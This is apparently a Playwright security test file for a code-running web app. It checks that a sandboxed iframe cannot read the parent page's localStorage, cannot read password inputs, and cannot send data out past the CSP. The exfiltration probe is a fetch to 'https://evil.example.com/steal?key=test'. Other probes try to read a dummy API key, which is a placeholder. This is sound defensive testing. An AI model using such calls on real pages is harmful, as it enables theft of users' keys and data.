import { test, expect } from '@playwright/test';

test.describe('App-level iframe and LLM security', () => {
  test.beforeEach(async ({ page }) => {
    // Set up localStorage before navigating
    await page.goto('http://localhost:5173');
    await page.evaluate(() => {
      localStorage.setItem('codevinci-llm-enabled', 'true');
      localStorage.setItem('codevinci-llm-config', JSON.stringify({
        provider: 'openai-compatible',
        apiEndpoint: 'http://localhost:11434/v1',
        apiKey: 'sk-test-secret-key-12345',
        defaultModel: 'gpt-4o',
        systemPrompt: 'You are a test assistant.',
        availableModels: ['gpt-4o'],
        connectionValid: true,
        temperature: 0.7,
        topP: 0.95,
        maxTokens: 4096,
        cspOrigin: 'http://localhost:11434',
      }));
    });
    await page.reload();
  });

  test('viewer iframe has sandbox="allow-scripts" without allow-same-origin', async ({ page }) => {
    // Accept disclaimer
    await setupAndAcceptDisclaimer(page);

    // Switch to View & Edit mode to show the viewer iframe
    await page.selectOption('select', 'view-edit');
    await page.waitForTimeout(1000);

    // Find the sandboxed iframe
    const iframe = page.frameLocator('iframe[sandbox="allow-scripts"]');
    await expect(iframe.locator('html')).toBeAttached({ timeout: 5000 });

    // Verify the iframe element has the correct sandbox
    const sandbox = await page.locator('iframe[sandbox="allow-scripts"]').getAttribute('sandbox');
    expect(sandbox).toBe('allow-scripts');

    // Verify the iframe has NO allow-same-origin permission
    const iframeElement = page.locator('iframe').first();
    const fullSandbox = await iframeElement.getAttribute('sandbox');
    expect(fullSandbox?.split(' ')).not.toContain('allow-same-origin');
  });

  test('user code in iframe cannot access parent localStorage', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);

    // Switch to View & Edit mode
    await page.selectOption('select', 'view-edit');
    await page.waitForTimeout(1000);

    // Wait for iframe to appear and load
    await page.waitForSelector('iframe[sandbox="allow-scripts"]', { timeout: 5000 });
    await page.waitForTimeout(1500);

    // Get the child frame (srcdoc iframes have url 'about:srcdoc')
    const frame = page.frames().find(f => f.url() === 'about:srcdoc');
    expect(frame).toBeDefined();

    // Inject JS into the iframe to test localStorage access
    const canAccess = await frame!.evaluate(() => {
      try {
        (parent as Window).localStorage.getItem('codevinci-llm-config');
        return { blocked: false as const, reason: 'accessed localStorage' };
      } catch (e) {
        return { blocked: true as const, error: (e as Error).message };
      }
    });

    expect(canAccess.blocked).toBe(true);
  });

  test('user code in iframe cannot read API key from parent DOM', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);

    // Switch to View & Edit mode
    await page.selectOption('select', 'view-edit');
    await page.waitForTimeout(500);
    await page.waitForSelector('iframe[sandbox="allow-scripts"]', { timeout: 5000 });
    await page.waitForTimeout(1500);

    const frame = page.frames().find(f => f.url() === 'about:srcdoc');
    expect(frame).toBeDefined();

    // Try to read the API key input from the parent DOM
    const canAccess = await frame!.evaluate(() => {
      try {
        const inputs = (parent as Window).document.querySelectorAll('input[type="password"]');
        return { blocked: false as const, count: inputs.length };
      } catch (e) {
        return { blocked: true as const, error: (e as Error).message };
      }
    });

    expect(canAccess.blocked).toBe(true);
  });

  test('CSP connect-src prevents iframe from exfiltrating data', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);

    // Check that CSP meta tag exists
    const cspContent = await page.evaluate(() => {
      const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
      return meta?.getAttribute('content');
    });
    expect(cspContent).toContain("connect-src 'self'");
    expect(cspContent).toContain('localhost:11434');
    expect(cspContent).not.toContain('evil');

    // Switch to edit mode to show the iframe
    await page.selectOption('select', 'view-edit');
    await page.waitForTimeout(500);
    await page.waitForSelector('iframe[sandbox="allow-scripts"]', { timeout: 5000 });
    await page.waitForTimeout(1500);

    const frame = page.frames().find(f => f.url() === 'about:srcdoc');
    expect(frame).toBeDefined();

    // Try to make a fetch from inside the iframe to an unauthorized origin
    const fetchResult = await frame!.evaluate(async () => {
      try {
        await fetch('https://evil.example.com/steal?key=test');
        return { blocked: false as const };
      } catch {
        return { blocked: true as const };
      }
    });

    expect(fetchResult.blocked).toBe(true);
  });
});

async function setupAndAcceptDisclaimer(page: import('@playwright/test').Page) {
  await page.getByRole('button', { name: 'Run code' }).click();
  await page.waitForTimeout(500);
}
